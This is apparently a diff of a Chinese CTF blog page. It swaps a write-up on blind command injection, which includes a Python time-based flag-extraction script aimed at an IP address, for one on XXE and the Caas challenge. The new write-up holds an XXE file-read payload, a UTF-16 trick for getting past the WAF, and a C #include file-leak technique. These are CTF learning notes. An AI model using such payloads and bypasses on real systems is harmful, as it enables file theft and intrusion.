@@ -20,18 +20,18 @@
     var CONFIG = {"hostname":"www.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="[钓鱼城杯]easyweb命令执行，post一个cmd，无回显不能连接外网。就是学一下shell语法，然后用时间盲注获得flag 题解一开始提交了一下ls发现就返回一个200，不知道命令有没有执行，跑一个sleep 3，有明显延迟，证明存在命令执行，但是没有回显试着弹一下shell，无果，用curl访问一下外网，无反应，证实不能连接外网。那就只能用判断语句来搜集信息了查一下shell语法https">
-<meta name="keywords" content="bash">
+  <meta name="description" content="[CSAWQual]Web_Unagi&amp;amp;[FireshellCTF]Caas两个BUU一分题，不难但也不算太简单 Web_Unagi题目就是个很明显的XXE，传一个XML文件上去，ban了ENTITY，SYSTEM，file之类的关键字 使用UTF16编码绕过，编码之后这种字符串匹配的waf就根本拦不住我们了，直接读文件就行">
+<meta name="keywords" content="wp,XXE">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[钓鱼城杯]easyweb">
-<meta property="og:url" content="https:&#x2F;&#x2F;www.z3ratu1.cn&#x2F;%5B%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%5Deasyweb.html">
+<meta property="og:title" content="[CSAWQual ]Web_Unagi&amp;[FireshellCTF]Caas">
+<meta property="og:url" content="https:&#x2F;&#x2F;www.z3ratu1.cn&#x2F;%5BCSAWQual%20%5DWeb_Unagi&amp;%5BFireshellCTF%5DCaas.html">
 <meta property="og:site_name" content="Z3ratu1&#39;s blog">
-<meta property="og:description" content="[钓鱼城杯]easyweb命令执行，post一个cmd，无回显不能连接外网。就是学一下shell语法，然后用时间盲注获得flag 题解一开始提交了一下ls发现就返回一个200，不知道命令有没有执行，跑一个sleep 3，有明显延迟，证明存在命令执行，但是没有回显试着弹一下shell，无果，用curl访问一下外网，无反应，证实不能连接外网。那就只能用判断语句来搜集信息了查一下shell语法https">
+<meta property="og:description" content="[CSAWQual]Web_Unagi&amp;amp;[FireshellCTF]Caas两个BUU一分题，不难但也不算太简单 Web_Unagi题目就是个很明显的XXE，传一个XML文件上去，ban了ENTITY，SYSTEM，file之类的关键字 使用UTF16编码绕过，编码之后这种字符串匹配的waf就根本拦不住我们了，直接读文件就行">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-08-31T08:30:37.864Z">
+<meta property="og:updated_time" content="2021-03-31T13:26:04.765Z">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://www.z3ratu1.cn/%5B%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%5Deasyweb.html">
+<link rel="canonical" href="https://www.z3ratu1.cn/%5BCSAWQual%20%5DWeb_Unagi&%5BFireshellCTF%5DCaas.html">
 
 
 <script id="page-configurations">
@@ -44,7 +44,7 @@
   };
 </script>
 
-  <title>[钓鱼城杯]easyweb | Z3ratu1's blog</title>
+  <title>[CSAWQual ]Web_Unagi&[FireshellCTF]Caas | Z3ratu1's blog</title>
   
 
 
@@ -198,7 +198,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://www.z3ratu1.cn/%5B%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%5Deasyweb.html">
+    <link itemprop="mainEntityOfPage" href="https://www.z3ratu1.cn/%5BCSAWQual%20%5DWeb_Unagi&%5BFireshellCTF%5DCaas.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
@@ -211,7 +211,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          [钓鱼城杯]easyweb
+          [CSAWQual ]Web_Unagi&[FireshellCTF]Caas
         </h1>
 
         <div class="post-meta">
@@ -222,7 +222,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-08-31 16:29:57 / 修改时间：16:30:37" itemprop="dateCreated datePublished" datetime="2020-08-31T16:29:57+08:00">2020-08-31</time>
+              <time title="创建时间：2021-03-31 20:01:52 / 修改时间：21:26:04" itemprop="dateCreated datePublished" datetime="2021-03-31T20:01:52+08:00">2021-03-31</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -235,7 +235,7 @@
             </span>
 
           
-            <span id="/%5B%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%5Deasyweb.html" class="post-meta-item leancloud_visitors" data-flag-title="[钓鱼城杯]easyweb" title="阅读次数">
+            <span id="/%5BCSAWQual%20%5DWeb_Unagi&%5BFireshellCTF%5DCaas.html" class="post-meta-item leancloud_visitors" data-flag-title="[CSAWQual ]Web_Unagi&[FireshellCTF]Caas" title="阅读次数">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -250,8 +250,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/%5B%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%5Deasyweb.html#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/%5B%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%5Deasyweb.html" itemprop="commentCount"></span>
+    <a title="valine" href="/%5BCSAWQual%20%5DWeb_Unagi&%5BFireshellCTF%5DCaas.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%5BCSAWQual%20%5DWeb_Unagi&%5BFireshellCTF%5DCaas.html" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -266,24 +266,31 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="钓鱼城杯-easyweb"><a href="#钓鱼城杯-easyweb" class="headerlink" title="[钓鱼城杯]easyweb"></a>[钓鱼城杯]easyweb</h1><p>命令执行，post一个cmd，无回显不能连接外网。就是学一下shell语法，然后用时间盲注获得flag</p>
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>一开始提交了一下ls发现就返回一个200，不知道命令有没有执行，跑一个sleep 3，有明显延迟，证明存在命令执行，但是没有回显<br>试着弹一下shell，无果，用curl访问一下外网，无反应，证实不能连接外网。<br>那就只能用判断语句来搜集信息了<br>查一下shell语法<br><a href="https://www.cnblogs.com/AloneSword/p/4489098.html" target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/AloneSword/p/4489098.html</a><br>可以用<code>if [ -f /flag.txt ]; then sleep 3; fi;</code>硬猜出来了flag位置（运气比较好）<br>接下来就是测flag内容，同样用时间盲注<br><code>bash -c &quot;if [[ \&quot;$(cat /flag.txt)\&quot; = flag{* ]]; then sleep 3; fi;&quot;</code><br>这里一开始判断语句一直出问题，最后用了[[ “$()”” = reg ]]这种形式终于搞了出来，一开始没有加外层的bash -c，结果就一直执行不出来，一开始还以为是把cat之类的给禁了，换了几个类似的读文件命令还是不行，最后突然想起来是不是用的不是bash，加了一个bash -c之后可以用了<br>贴一个自动注入脚本</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-<span class="token keyword">import</span> time
-str1 <span class="token operator">=</span> <span class="token string">"1234567890qwertyuiopasdfghjklzxcvbnm_-QWERTYUIOPASDFGHJKLZXCVBNM{}"</span>
-url <span class="token operator">=</span> <span class="token string">"http://119.3.37.185/"</span>
-payload <span class="token operator">=</span> <span class="token string">""</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">for</span> s <span class="token keyword">in</span> str1<span class="token punctuation">:</span>
-        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"cmd"</span><span class="token punctuation">:</span> <span class="token string">'bash -c "if [[ \"$(cat /flag.txt)\" = %s* ]]; then sleep 3; fi;"'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>payload <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">}</span>
-        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
-        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">:</span>
-            payload <span class="token operator">+=</span> s
-            <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre>
-<h2 id="easyseed"><a href="#easyseed" class="headerlink" title="easyseed"></a>easyseed</h2><p>垃圾题，点名批评，啥也不给，需要扫描才能拿到一个加密脚本，为index.bak，然后就是经典的PHP随机数种子爆破，爆破出来之后提交也不会对，因为需要把XFF换成127.0.0.1，为什么呢，因为这个是超级脑洞，猜！</p>
+        <h1 id="CSAWQual-Web-Unagi-amp-FireshellCTF-Caas"><a href="#CSAWQual-Web-Unagi-amp-FireshellCTF-Caas" class="headerlink" title="[CSAWQual]Web_Unagi&amp;[FireshellCTF]Caas"></a>[CSAWQual]Web_Unagi&amp;[FireshellCTF]Caas</h1><p>两个BUU一分题，不难但也不算太简单</p>
+<h2 id="Web-Unagi"><a href="#Web-Unagi" class="headerlink" title="Web_Unagi"></a>Web_Unagi</h2><p>题目就是个很明显的XXE，传一个XML文件上去，ban了ENTITY，SYSTEM，file之类的关键字</p>
+<p>使用UTF16编码绕过，编码之后这种字符串匹配的waf就根本拦不住我们了，直接读文件就行</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-16"?></span>
+<span class="token doctype">&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY ></span>
+&lt;!ENTITY aa SYSTEM "file:///flag" >]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>aa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>passwd1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>aa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>email</span><span class="token punctuation">></span></span>alice@fakesite.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>email</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span>CSAW2019<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intro</span><span class="token punctuation">></span></span><span class="token entity" title="&aa;">&amp;aa;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>intro</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span></code></pre>
+<p>这里主要是记录一下XXE之类的东西，这个题倒是没什么太多可记录的东西</p>
+<h3 id="UTF-8-amp-amp-UTF-16"><a href="#UTF-8-amp-amp-UTF-16" class="headerlink" title="UTF-8 &amp;&amp; UTF-16"></a>UTF-8 &amp;&amp; UTF-16</h3><p>UTF-8是无敌常见的编码类型，用变长字节指定一个字符，对于ASCII码就是正常的一个字节，其他字符可能用两个或者三个字节表示。UTF-16就固定的用两个字节表示一个字符，对于ASCII码也得使用两个字节，所以每个ASCII码前面也得加一个\x00空字符进去<br>写了个python脚本逐字符的加\x00进去的不能用。。。不知道是python在read的时候缺了啥还是windows和Linux上换行CLRF之类的区别的问题</p>
+<p>插入了一个空字符这种字符串匹配的检测就根本无法拦截我们，编码在xml第一行的定义里写上即可，整个文件都需要进行编码<br>用这个命令可以直接进行编码转换<code>cat a.xml | iconv -f UTF-8 -t UTF-16BE &gt; payload.xml</code><br>BE指的是big endian，对应的还有LE little endian，就是大小端序</p>
+<p>有一种说法是直接看文件开头几个字符就能直接确定文件的类型。比如UTF-8是<code>EF BB BF</code>而UTF-16BE是<code>FF FE</code>，但是我010editor打开之后并没有看到这些字节。。</p>
+<h3 id="XXE的攻击面"><a href="#XXE的攻击面" class="headerlink" title="XXE的攻击面"></a>XXE的攻击面</h3><p>XXE可以说是SSRF的一种特化？最常见的攻击方式就是用file://协议之类的进行文件读取了，读<code>/etc/network/interfaces /proc/net/arp /etc/host</code>这几个文件进行内网探测之类的，不过不能解析的数据同样可以用CDATA拼一下转义掉再外带。也可以发http协议进行ssrf，端口探测。在PHP中支持PHP伪协议，在安装了expect扩展时可以利用其进行RCE，在java中可以使用jar协议文件上传。</p>
+<h2 id="FireshellCTF-Caas"><a href="#FireshellCTF-Caas" class="headerlink" title="[FireshellCTF]Caas"></a>[FireshellCTF]Caas</h2><p>很奇怪的题目，写一个C代码，然后编译完了返回一个二进制文件，不符合语法会报错。<br>从报错中大概可以猜出来后端逻辑是把输入写入/tmp下一个随机文件名的.c文件，然后gcc编译，编译成功就返回二进制文件，失败就返回报错，看起来整个流程非常的安全，写入文件名不可控，写入文件后缀固定为.c，gcc编译可能用的命令执行但是文件名完全不可控，也没有利用点了<br>一开始在想有没有命令注入，可能是echo进去的文件之类的（不太现实）。测了一下发现不行。看wp</p>
+<p>直接使用了C的#include语句进行了文件包含。。。这我真没想到，好久没写C都忘了这茬了。利用的是报错的外带，因为flag文件肯定不符合C语法，在编译的时候include进来，这里就必然引发一个错误，而报错的点就是引发错误的flag文件，自然就把文件内容外带了<br>这种利用想法还真令人眼前一亮，完全没想到，学习了</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/kingcat/archive/2012/10/16/2726334.html" target="_blank" rel="external nofollow noopener noreferrer">Unicode(UTF-8, UTF-16)令人混淆的概念</a><br><a href="https://www.anquanke.com/post/id/170655" target="_blank" rel="external nofollow noopener noreferrer">XXE Bypass WAF</a><br><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="external nofollow noopener noreferrer">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p>
 
     </div>
 
@@ -293,7 +300,8 @@ payload <span class="token operator">=</span> <span class="token string">""</spa
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/bash/" rel="tag"># bash</a>
+              <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/XXE/" rel="tag"># XXE</a>
           </div>
 
         
@@ -302,13 +310,10 @@ payload <span class="token operator">=</span> <span class="token string">""</spa
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5Dweb.html" rel="prev" title="[强网杯2020] web">
-      <i class="fa fa-chevron-left"></i> [强网杯2020] web
+    <a href="/MAR%20DASCTF2021.html" rel="prev" title="MAR DASCTF2021">
+      <i class="fa fa-chevron-left"></i> MAR DASCTF2021
     </a></div>
-      <div class="post-nav-item">
-    <a href="/%5BGACTF2020%5D.html" rel="next" title="[GACTF2020]web">
-      [GACTF2020]web <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -368,7 +373,7 @@ payload <span class="token operator">=</span> <span class="token string">""</spa
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#钓鱼城杯-easyweb"><span class="nav-number">1.</span> <span class="nav-text">[钓鱼城杯]easyweb</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题解"><span class="nav-number">1.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyseed"><span class="nav-number">1.2.</span> <span class="nav-text">easyseed</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CSAWQual-Web-Unagi-amp-FireshellCTF-Caas"><span class="nav-number">1.</span> <span class="nav-text">[CSAWQual]Web_Unagi&amp;[FireshellCTF]Caas</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Unagi"><span class="nav-number">1.1.</span> <span class="nav-text">Web_Unagi</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UTF-8-amp-amp-UTF-16"><span class="nav-number">1.1.1.</span> <span class="nav-text">UTF-8 &amp;&amp; UTF-16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE的攻击面"><span class="nav-number">1.1.2.</span> <span class="nav-text">XXE的攻击面</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FireshellCTF-Caas"><span class="nav-number">1.2.</span> <span class="nav-text">[FireshellCTF]Caas</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">1.3.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
